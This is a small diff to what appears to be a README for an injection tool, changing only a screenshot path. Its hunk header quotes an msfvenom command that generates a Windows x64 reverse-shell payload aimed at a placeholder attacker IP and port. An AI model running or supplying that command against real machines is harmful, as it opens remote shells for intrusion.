@@ -24,7 +24,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP LPORT=PORT -f c
 
 ## 🖼️ Screenshots
 
-![Injection Demo](screenshots/injection_demo.png)
+![Injection Demo](screenshot/analysis.png)
 
 ## 📁 File Structure
 
